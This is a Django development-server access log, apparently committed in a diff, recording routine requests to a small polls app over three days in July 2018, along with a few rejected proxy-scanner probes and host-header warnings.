+[19/Jul/2018 22:05:02] "GET /static/polls/style_home.css HTTP/1.1" 200 260
+[19/Jul/2018 22:05:26] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:05:26] "GET /static/polls/style_home.css HTTP/1.1" 200 260
+[19/Jul/2018 22:05:30] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[19/Jul/2018 22:09:03] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:09:04] "GET /static/polls/style_home.css HTTP/1.1" 200 258
+[19/Jul/2018 22:09:16] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:09:16] "GET /static/polls/style_home.css HTTP/1.1" 200 258
+[19/Jul/2018 22:09:29] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:09:29] "GET /static/polls/style_home.css HTTP/1.1" 200 258
+[19/Jul/2018 22:10:23] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[19/Jul/2018 22:11:50] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:11:50] "GET /static/polls/style_home.css HTTP/1.1" 200 289
+[19/Jul/2018 22:12:23] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:12:23] "GET /static/polls/style_home.css HTTP/1.1" 200 314
+[19/Jul/2018 22:14:46] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:14:47] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+[19/Jul/2018 22:15:22] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 22:15:22] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+[19/Jul/2018 23:26:27] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:26:27] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[19/Jul/2018 23:26:29] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:26:30] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:26:31] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:26:49] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:26:49] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+[19/Jul/2018 23:26:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[19/Jul/2018 23:27:33] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:27:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+[19/Jul/2018 23:27:35] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:27:36] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 23:27:38] "GET /polls/home/?searchtext= HTTP/1.1" 200 2107
+[19/Jul/2018 23:27:39] "GET /polls/home/?searchtext= HTTP/1.1" 200 2107
+[19/Jul/2018 23:27:40] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[20/Jul/2018 12:45:02] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+[20/Jul/2018 15:14:26] "GET /polls/home/ HTTP/1.1" 200 2107
+[20/Jul/2018 15:14:28] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+Not Found: /favicon.ico
+[20/Jul/2018 15:14:29] "GET /favicon.ico HTTP/1.1" 404 2083
+[20/Jul/2018 15:15:05] "GET /polls/home/ HTTP/1.1" 200 2107
+[20/Jul/2018 15:15:07] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+[20/Jul/2018 15:15:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 15:15:17] "GET /polls/home/ HTTP/1.1" 200 2107
+[20/Jul/2018 15:15:19] "GET /static/polls/style_home.css HTTP/1.1" 200 347
+[20/Jul/2018 15:15:27] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 15:15:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 15:19:00] "GET /polls/home/ HTTP/1.1" 200 2107
+[20/Jul/2018 15:19:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 15:19:55] "GET /polls/home/ HTTP/1.1" 200 2107
+[20/Jul/2018 15:43:01] "GET /polls/home/ HTTP/1.1" 200 2107
+Invalid HTTP_HOST header: 'check.proxyradar.com'. You may need to add 'check.proxyradar.com' to ALLOWED_HOSTS.
+[20/Jul/2018 18:05:15] "POST http://check.proxyradar.com/azenv.php?auth=153208111583&a=PSCMN&i=1815985070&p=8000 HTTP/1.1" 400 61131
+[20/Jul/2018 20:27:13] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:27:14] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 20:27:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[20/Jul/2018 20:27:14] "GET /favicon.ico HTTP/1.1" 404 2083
+[20/Jul/2018 20:29:13] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:29:13] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:29:14] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:07] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:08] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:09] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:09] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:50] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:31:51] "GET /static/polls/style_home.css HTTP/1.1" 200 403
+[20/Jul/2018 20:31:51] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:32:07] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:32:07] "GET /static/polls/style_home.css HTTP/1.1" 200 403
+[20/Jul/2018 20:32:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:32:52] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:32:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:32:52] "GET /static/polls/style_home.css HTTP/1.1" 200 407
+[20/Jul/2018 20:33:08] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:33:08] "GET /static/polls/style_home.css HTTP/1.1" 200 407
+[20/Jul/2018 20:33:08] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:35:55] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:35:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:35:55] "GET /static/polls/style_home.css HTTP/1.1" 200 409
+[20/Jul/2018 20:36:30] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:30] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:36:31] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:31] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:36:32] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:36:32] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:33] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:33] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:36:34] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:34] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:36:35] "GET /polls/home/ HTTP/1.1" 200 2123
+[20/Jul/2018 20:36:35] "GET /static/polls/style_home.css HTTP/1.1" 200 412
+[20/Jul/2018 20:36:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 20:42:21] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 20:42:21] "GET /static/polls/style_home.css HTTP/1.1" 200 404
+[20/Jul/2018 20:42:21] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[20/Jul/2018 21:42:48] "GET / HTTP/1.1" 404 2027
+Not Found: /favicon.ico
+[20/Jul/2018 21:42:51] "GET /favicon.ico HTTP/1.1" 404 2083
+[20/Jul/2018 21:50:00] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:50:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:50:00] "GET /static/polls/style_home.css HTTP/1.1" 200 379
+[20/Jul/2018 21:50:00] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:50:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:50:00] "GET /static/polls/style_home.css HTTP/1.1" 200 379
+[20/Jul/2018 21:50:32] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:50:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:50:32] "GET /static/polls/style_home.css HTTP/1.1" 200 429
+[20/Jul/2018 21:52:18] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:52:18] "GET /static/polls/style_home.css HTTP/1.1" 200 429
+[20/Jul/2018 21:52:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:54:01] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:54:02] "GET /static/polls/style_home.css HTTP/1.1" 200 457
+[20/Jul/2018 21:54:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:54:18] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:54:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:54:18] "GET /static/polls/style_home.css HTTP/1.1" 200 464
+[20/Jul/2018 21:55:33] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:55:33] "GET /static/polls/style_home.css HTTP/1.1" 200 429
+[20/Jul/2018 21:55:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:56:15] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:56:15] "GET /static/polls/style_home.css HTTP/1.1" 200 499
+[20/Jul/2018 21:56:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 21:56:37] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 21:56:37] "GET /static/polls/style_home.css HTTP/1.1" 200 476
+[20/Jul/2018 21:56:37] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:00:52] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 22:00:52] "GET /static/polls/style_home.css HTTP/1.1" 200 503
+[20/Jul/2018 22:00:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:01:47] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 22:01:47] "GET /static/polls/style_home.css HTTP/1.1" 200 458
+[20/Jul/2018 22:01:47] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:03:23] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 22:03:23] "GET /static/polls/style_home.css HTTP/1.1" 200 513
+[20/Jul/2018 22:03:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:04:30] "GET /polls/home/ HTTP/1.1" 200 2135
+[20/Jul/2018 22:04:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:04:31] "GET /static/polls/style_home.css HTTP/1.1" 200 513
+[20/Jul/2018 22:05:11] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:05:11] "GET /static/polls/style_home.css HTTP/1.1" 200 513
+[20/Jul/2018 22:05:11] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 22:06:22] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:06:22] "GET /static/polls/style_home.css HTTP/1.1" 200 534
+[20/Jul/2018 22:06:31] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:06:32] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:06:33] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:06:33] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:10:04] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:10:04] "GET /static/polls/style_home.css HTTP/1.1" 200 566
+[20/Jul/2018 22:10:13] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:10:13] "GET /static/polls/style_home.css HTTP/1.1" 200 566
+[20/Jul/2018 22:10:26] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:10:26] "GET /static/polls/style_home.css HTTP/1.1" 200 566
+[20/Jul/2018 22:11:22] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:11:22] "GET /static/polls/style_home.css HTTP/1.1" 200 567
+[20/Jul/2018 22:14:56] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:14:56] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:15:20] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:15:20] "GET /static/polls/style_home.css HTTP/1.1" 200 588
+[20/Jul/2018 22:15:21] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:15:21] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:15:22] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:15:22] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:16:20] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:16:21] "GET /static/polls/style_home.css HTTP/1.1" 200 609
+[20/Jul/2018 22:16:21] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:16:22] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:16:44] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:16:44] "GET /static/polls/style_home.css HTTP/1.1" 200 616
+[20/Jul/2018 22:16:45] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:16:45] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:16:46] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:16:46] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:20:00] "GET /polls/home/ HTTP/1.1" 200 2071
+[20/Jul/2018 22:20:00] "GET /static/polls/style_home.css HTTP/1.1" 200 604
+[20/Jul/2018 22:20:11] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:20:11] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 22:20:50] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:20:50] "GET /static/polls/style_home.css HTTP/1.1" 200 603
+[20/Jul/2018 22:21:46] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 22:21:47] "GET /static/polls/style_home.css HTTP/1.1" 200 630
+[20/Jul/2018 22:55:20] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:03:34] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 23:03:34] "GET /static/polls/style_home.css HTTP/1.1" 200 685
+[20/Jul/2018 23:03:35] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 23:03:36] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:03:36] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 23:03:37] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:04:03] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 23:04:03] "GET /static/polls/style_home.css HTTP/1.1" 200 687
+[20/Jul/2018 23:05:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:05:27] "GET /polls/home/ HTTP/1.1" 200 2050
+[20/Jul/2018 23:05:28] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:06:04] "GET /polls/home/ HTTP/1.1" 200 2075
+[20/Jul/2018 23:06:04] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:06:21] "GET /polls/home/ HTTP/1.1" 200 2076
+[20/Jul/2018 23:06:22] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:07:59] "GET /polls/home/ HTTP/1.1" 200 2078
+[20/Jul/2018 23:08:00] "GET /static/polls/style_home.css HTTP/1.1" 200 743
+[20/Jul/2018 23:08:37] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:08:37] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:39:49] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:39:49] "GET /static/polls/style_home.css HTTP/1.1" 200 743
+[20/Jul/2018 23:39:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /favicon.ico
+[20/Jul/2018 23:39:50] "GET /favicon.ico HTTP/1.1" 404 2083
+[20/Jul/2018 23:40:37] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:40:39] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:40:55] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:40:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:40:55] "GET /static/polls/style_home.css HTTP/1.1" 200 743
+[20/Jul/2018 23:49:35] "GET /polls/home/ HTTP/1.1" 200 2037
+[20/Jul/2018 23:49:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:49:35] "GET /static/polls/style_home.css HTTP/1.1" 200 771
+[20/Jul/2018 23:52:28] "GET /polls/home/ HTTP/1.1" 200 2066
+[20/Jul/2018 23:52:28] "GET /static/polls/style_home.css HTTP/1.1" 200 771
+[20/Jul/2018 23:52:28] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:55:28] "GET /polls/home/ HTTP/1.1" 200 2066
+[20/Jul/2018 23:55:28] "GET /static/polls/style_home.css HTTP/1.1" 200 771
+[20/Jul/2018 23:56:12] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:56:12] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:58:49] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:58:49] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[20/Jul/2018 23:58:51] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:58:51] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:58:54] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[20/Jul/2018 23:59:05] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:59:05] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[20/Jul/2018 23:59:05] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:59:06] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:59:06] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[20/Jul/2018 23:59:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:59:07] "GET /polls/home/ HTTP/1.1" 200 1994
+[20/Jul/2018 23:59:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[20/Jul/2018 23:59:07] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[21/Jul/2018 00:02:04] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:04] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:02:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:05] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:05] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:02:05] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:06] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:06] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:02:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:07] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:08] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:02:08] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:09] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:09] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:02:09] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:32] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:33] "GET /static/polls/style_home.css HTTP/1.1" 200 819
+[21/Jul/2018 00:02:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:02:34] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:02:34] "GET /static/polls/style_home.css HTTP/1.1" 200 819
+[21/Jul/2018 00:02:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:03:44] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:03:44] "GET /static/polls/style_home.css HTTP/1.1" 200 821
+[21/Jul/2018 00:03:44] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:03:57] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:03:57] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[21/Jul/2018 00:03:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:03:58] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:03:58] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[21/Jul/2018 00:03:58] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:07:27] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:07:27] "GET /static/polls/style_home.css HTTP/1.1" 200 822
+[21/Jul/2018 00:07:27] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:10:16] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:10:16] "GET /static/polls/style_home.css HTTP/1.1" 200 821
+[21/Jul/2018 00:10:16] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:10:40] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:10:40] "GET /static/polls/style_home.css HTTP/1.1" 200 822
+[21/Jul/2018 00:10:40] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:12:43] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:12:43] "GET /static/polls/style_home.css HTTP/1.1" 200 812
+[21/Jul/2018 00:12:43] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:13:03] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:13:03] "GET /static/polls/style_home.css HTTP/1.1" 200 820
+[21/Jul/2018 00:13:03] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:13:45] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:13:45] "GET /static/polls/style_home.css HTTP/1.1" 200 817
+[21/Jul/2018 00:13:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:14:04] "GET /polls/home/ HTTP/1.1" 200 1994
+[21/Jul/2018 00:14:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 00:14:04] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 00:14:57] "GET /polls/home/ HTTP/1.1" 200 2011
+[21/Jul/2018 00:14:57] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 00:14:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[21/Jul/2018 07:54:43] "HEAD / HTTP/1.0" 400 58382
+Not Found: /
+[21/Jul/2018 09:13:55] "GET / HTTP/1.1" 404 2032
+[21/Jul/2018 16:34:51] "GET /polls/home/ HTTP/1.1" 200 2011
+[21/Jul/2018 16:34:51] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 16:34:51] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /favicon.ico
+[21/Jul/2018 16:34:53] "GET /favicon.ico HTTP/1.1" 404 2083
+[21/Jul/2018 17:24:09] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 17:24:17] "GET /polls/home/ HTTP/1.1" 200 2019
+[21/Jul/2018 17:50:45] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 17:50:46] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 17:58:05] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 17:59:24] "GET /polls/home/ HTTP/1.1" 200 2018
+Invalid HTTP_HOST header: 'www.inktrickle.com:8000'. You may need to add 'www.inktrickle.com' to ALLOWED_HOSTS.
+[21/Jul/2018 19:42:14] "GET /polls/home/ HTTP/1.1" 400 59605
+Invalid HTTP_HOST header: 'www.inktrickle.com:8000'. You may need to add 'www.inktrickle.com' to ALLOWED_HOSTS.
+[21/Jul/2018 19:42:14] "GET /favicon.ico HTTP/1.1" 400 59583
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 11, 2018 - 23:00:09
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:8000/
+Quit the server with CONTROL-C.
+[21/Jul/2018 19:43:02] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 19:43:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 19:43:02] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+Not Found: /favicon.ico
+[21/Jul/2018 19:43:02] "GET /favicon.ico HTTP/1.1" 404 2087
+[21/Jul/2018 19:43:13] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 20:56:19] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:06:57] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:06:57] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:06:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /favicon.ico
+[21/Jul/2018 21:06:57] "GET /favicon.ico HTTP/1.1" 404 2078
+[21/Jul/2018 21:09:55] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:09:58] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:10:39] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:10:51] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:10:52] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:10:53] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:11:09] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:11:09] "GET /static/polls/style_home.css HTTP/1.1" 200 806
+[21/Jul/2018 21:11:09] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:11:23] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:11:23] "GET /static/polls/style_home.css HTTP/1.1" 200 831
+[21/Jul/2018 21:11:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:12:23] "GET /polls/home/ HTTP/1.1" 200 2018
